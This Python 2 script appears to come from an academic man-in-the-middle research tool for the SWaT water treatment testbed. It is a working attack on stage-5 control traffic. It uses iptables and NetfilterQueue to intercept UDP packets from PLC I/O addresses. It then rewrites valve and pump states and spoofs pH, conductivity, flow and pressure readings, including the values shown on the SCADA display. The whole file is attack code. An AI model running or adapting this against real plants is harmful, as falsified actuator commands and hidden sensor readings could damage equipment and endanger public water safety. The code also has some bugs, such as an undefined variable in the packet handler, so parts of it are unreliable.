#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2019  Beebi Siti Salimah Binte Liyakkathali, liyakkathali@sutd.edu.sg
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

#Last modified on: 07 May 2019

# Script part of A6_L0 Mitm tool: https://github.com/ibmilo/A6-L0-MITM
# Some attributes to 	https://github.com/ifyouaretea/A6-MITM
#			https://github.com/scy-phy/swat


import datetime
import ctypes
from time import sleep
from time import time as ts
import signal
import os
import sys
from netfilterqueue import NetfilterQueue
from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from _PLC5 import SWAT_P5_RIO_DO, SWAT_P5_RIO_DI, SWAT_P5_RIO_AI

from scaling_all import P1Flow, P1Level, P2Flow, P2Cond, P2Ph, P2Orp, P3Level, P3Flow, P3DPress, \
                    P4Level, P4Hrdss, P4Flow, P4Orp, \
                    P5FeedPh, P5FeedOrp, P5FeedCond, P5PremCond, P5FeedFlow, P5PermFlow,\
                    P5ConcFlow, P5RecFlow, P5HPumpPress, P5PermPress, P5ConcPress,\
                    P6BackFlow, current_to_signal, signal_to_current



global toggle_flag
global current_spoofed


device_type = []
device_tag = []
value = []
scada = []

#note: pump at stage 5 is VSD pump

class attack_P5_level0:

    toggle_flag = False
 

    def __init__(self):
        self.toggle_flag = False


    def start(self):
        self.nfqueue = NetfilterQueue()
        os.system('sudo iptables -t mangle -A PREROUTING -s  192.168.0.52,192.168.0.50,192.168.0.57,192.168.0.59 -p udp --dport 2222 -j NFQUEUE --queue-num 2')
        self.nfqueue.bind(2, self._launch_P5_attack,10)
        self.nfqueue.run()
        print('***********************inject start******************************')


    def stop(self):
        os.system('cat /proc/net/netfilter/nfnetlink_queue')
        os.system('sudo iptables -t mangle -F')
        self.nfqueue.unbind()
        print('*** STOPPING IPTABLES ***')


    def _launch_P5_attack(self,packet):

      global device_tag
      global value
      global scada 

      length = len(device_tag)
      ind = 0
      pkt = IP(packet.get_payload())

      while ind < length:

        dev = device_tag[ind]
        val = value[ind]

        if SWAT_P5_RIO_DI in pkt:
          if dev == "P501":
            pkt[SWAT_P5_RIO_DI].P501_Run = sca

          elif dev == "P502": 
            pkt[SWAT_P5_RIO_DI].P502_Run = sca

  



          else:

            if sca == 0:


                if dev  == "MV501":
                    pkt[SWAT_P5_RIO_DI].MV501_Close = 1
                    pkt[SWAT_P5_RIO_DI].MV501_Open = 0

                elif dev  == "MV502":
                    pkt[SWAT_P5_RIO_DI].MV502_Close = 1
                    pkt[SWAT_P5_RIO_DI].MV502_Open = 0

                elif dev  == "MV503":
                    pkt[SWAT_P5_RIO_DI].MV503_Close = 1
                    pkt[SWAT_P5_RIO_DI].MV503_Open = 0

                else: #dev  == "MV504":
                  pkt[SWAT_P5_RIO_DI].MV504_Close = 1
                  pkt[SWAT_P5_RIO_DI].MV504_Open = 0



            else :#sca == 1:

                

                if dev  == "MV501":
                    pkt[SWAT_P5_RIO_DI].MV501_Close = 0
                    pkt[SWAT_P5_RIO_DI].MV501_Open = 1

                elif dev  == "MV502":
                    pkt[SWAT_P5_RIO_DI].MV502_Close = 0
                    pkt[SWAT_P5_RIO_DI].MV502_Open = 1

                elif dev  == "MV503":
                    pkt[SWAT_P5_RIO_DI].MV503_Close = 0
                    pkt[SWAT_P5_RIO_DI].MV503_Open = 1

                else :#if dev  == "MV504":
                  pkt[SWAT_P5_RIO_DI].MV504_Close = 0
                  pkt[SWAT_P5_RIO_DI].MV504_Open = 1
        


        if SWAT_P5_RIO_DO in pkt:

            if val == 0:
                if dev  == "MV501":
                    pkt[SWAT_P5_RIO_DO].MV501_Close = 1
                    pkt[SWAT_P5_RIO_DO].MV501_Open = 0

                elif dev  == "MV502":
                    pkt[SWAT_P5_RIO_DO].MV502_Close = 1
                    pkt[SWAT_P5_RIO_DO].MV502_Open = 0

                elif dev  == "MV503":
                    pkt[SWAT_P5_RIO_DO].MV503_Close = 1
                    pkt[SWAT_P5_RIO_DO].MV503_Open = 0

                else: #if dev  == "MV504":
                    pkt[SWAT_P5_RIO_DO].MV504_Close = 1
                    pkt[SWAT_P5_RIO_DO].MV504_Open = 0

            else : # val == 1:
              if dev  == "MV501":
                  pkt[SWAT_P5_RIO_DO].MV501_Close = 0
                  pkt[SWAT_P5_RIO_DO].MV501_Open = 1

              elif dev  == "MV502":
                  pkt[SWAT_P5_RIO_DO].MV502_Close = 0
                  pkt[SWAT_P5_RIO_DO].MV502_Open = 1

              elif dev  == "MV503":
                  pkt[SWAT_P5_RIO_DO].MV503_Close = 0
                  pkt[SWAT_P5_RIO_DO].MV503_Open = 1

              else: # dev  == "MV504":
                  pkt[SWAT_P5_RIO_DO].MV504_Close = 0
                  pkt[SWAT_P5_RIO_DO].MV504_Open = 1



          
        if SWAT_P5_RIO_AI in pkt:

          if dev == "AIT501":

            self.true_measurement_P5_pH =  current_to_signal(pkt[SWAT_P5_RIO_AI].AIT501_pH, P5FeedPh)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_pH
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5FeedPh) 
              pkt[SWAT_P5_RIO_AI].AIT501_pH =  current_spoofed

              print('AIT501 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_pH,spoofed_measurement))


          if dev == "AIT502":

            self.true_measurement_P5_ORP =  current_to_signal(pkt[SWAT_P5_RIO_AI].AIT502_ORP, P5FeedOrp)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_ORP
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5FeedOrp) 
              pkt[SWAT_P5_RIO_AI].AIT502_ORP =  current_spoofed

              print('AIT502 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_ORP,spoofed_measurement))


          if dev == "AIT503":

            self.true_measurement_P5_Cond =  current_to_signal(pkt[SWAT_P5_RIO_AI].AIT503_Water_Cond, P5FeedCond)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_Cond
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5FeedCond) 
              pkt[SWAT_P5_RIO_AI].AIT503_Water_Cond =  current_spoofed

              print('AIT503 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_Cond,spoofed_measurement))

          if dev == "AIT504":

            self.true_measurement_P5_PermCond =  current_to_signal(pkt[SWAT_P5_RIO_AI].AIT504_Perm_Cond, P5PremCond)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_PermCond
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5PremCond) 
              pkt[SWAT_P5_RIO_AI].AIT504_Perm_Cond =  current_spoofed

              print('AIT504 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_PermCond,spoofed_measurement))


          if dev == "FIT501":

            self.true_measurement_P5_FeedFlow =  current_to_signal(pkt[SWAT_P5_RIO_AI].FIT501_Feed_Flow, P5FeedFlow)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_FeedFlow
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5FeedFlow) 
              pkt[SWAT_P5_RIO_AI].FIT501_Feed_Flow =  current_spoofed

              print('FIT501 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_FeedFlow,spoofed_measurement))

          if dev == "FIT502":

            self.true_measurement_P5_PermFlow =  current_to_signal(pkt[SWAT_P5_RIO_AI].FIT502_Perm_Flow, P5PermFlow)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_PermFlow
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5PermFlow) 
              pkt[SWAT_P5_RIO_AI].FIT502_Perm_Flow =  current_spoofed

              print('FIT502 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_PermFlow,spoofed_measurement))


          if dev == "FIT503":


            self.true_measurement_P5_ConFlow =  current_to_signal(pkt[SWAT_P5_RIO_AI].FIT503_Con_Flow, P5ConcFlow)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_ConFlow
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5ConcFlow) 
              pkt[SWAT_P5_RIO_AI].FIT503_Con_Flow =  current_spoofed

              print('FIT503 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_ConFlow,spoofed_measurement))


          if dev == "FIT504":

            self.true_measurement_P5_RecFlow =  current_to_signal(pkt[SWAT_P5_RIO_AI].FIT504_Recirculation_Flow, P5RecFlow)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_RecFlow
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5RecFlow) 
              pkt[SWAT_P5_RIO_AI].FIT504_Recirculation_Flow =  current_spoofed

              print('FIT504 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_RecFlow,spoofed_measurement))


          if dev == "PIT501":

            self.true_measurement_P5_PumpPress =  current_to_signal(pkt[SWAT_P5_RIO_AI].PIT501_RO_Pressure, P5HPumpPress)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_PumpPress
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5HPumpPress) 
              pkt[SWAT_P5_RIO_AI].PIT501_RO_Pressure =  current_spoofed

              print('PIT501 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_PumpPress,spoofed_measurement))


          if dev == "PIT502":

            self.true_measurement_P5_PermPress =  current_to_signal(pkt[SWAT_P5_RIO_AI].PIT502_Perm_Pressure, P5PermPress)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_PermPress
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5PermPress) 
              pkt[SWAT_P5_RIO_AI].PIT502_Perm_Pressure =  current_spoofed

              print('PIT502 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_PermPress,spoofed_measurement))


          if dev == "PIT503":

            self.true_measurement_P5_ConcPress =  current_to_signal(pkt[SWAT_P5_RIO_AI].PIT503_Con_Pressure, P5ConcPress)  #scaling

            if(self.toggle_flag == False):
              spoofed_measurement = self.true_measurement_P5_ConcPress
              self.toggle_flag = True

            if(self.toggle_flag):
              spoofed_measurement = val
              current_spoofed = signal_to_current(spoofed_measurement, P5ConcPress) 
              pkt[SWAT_P5_RIO_AI].PIT503_Con_Pressure =  current_spoofed

              print('PIT503 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P5_ConcPress,spoofed_measurement))



        ind = ind +1
        del pkt[UDP].chksum  # Need to recompute checksum
        pkt.show()
        packet.set_payload(str(pkt))

      packet.accept()


def start():

  attacker = attack_P5_level0();
  #def signal_term_handler(signal, frame):
  #  print('*** STOPPING')
  #  attacker.stop()

  #signal.signal(signal.SIGTERM, signal_term_handler)
  try:
    print('attacker is loaded')
    attacker.start()
    signal.pause()  # wait for a signal
  except KeyboardInterrupt:
    print('*** STOPPING')
    attacker.stop()






if __name__=='__main__':
    num_of_attacks = int(raw_input('Enter number of actuators attacks : '))


    for i in range (num_of_attacks) :
        print ("For Point %i >>>") % (i + 1)

        dev_type = raw_input('Enter device type to attack (e.g VALVE, PSH) : ')
        dev_tag = raw_input('Enter tag  to attack (e.g MV501, PSH501 ) : ')


        if dev_type == "VALVE" or dev_type == "LED" or dev_type == "VSD":
          val =  int (raw_input('Enter value - ON (1) or OFF (0) : '))
          sca =  int (raw_input('Set SCADA display to - ON (1) or OFF (0) : '))

      



        elif dev_type == "FIT" or dev_type == "LIT" or dev_type == "AIT" or dev_type == "PIT":
            dev_tag = raw_input('Enter tag  to attack (e.g MV501, FIT501) : ')
            val =  int (raw_input('Enter value to spoofed value : '))
            sca = 0

        elif  dev_type == "PUMP": 
            print "use A6S_lvl0_VSD.py script to attack pump"
            sys.exit()
        else:
            print "Device type not found"
            sys.exit()


        


        if dev_tag == "MV501"  or dev_tag == "MV502"  or dev_tag == "MV503"  or dev_tag == "MV504" \
        or dev_tag == "AIT501" or dev_tag == "AIT502" or dev_tag == "AIT503" or dev_tag == "AIT504" \
        or dev_tag == "FIT501" or dev_tag == "FIT502" or dev_tag == "FIT503" or dev_tag == "FIT504"\
        or dev_tag == "PIT501" or dev_tag == "PIT502" or dev_tag == "PIT503" :
       
         
       
          device_type.append(dev_type)
          device_tag.append(dev_tag)
          value.append(val)
          scada.append(sca)
          
        else:
          print "Device tag not found"
          sys.exit()

    sys.exit(start())








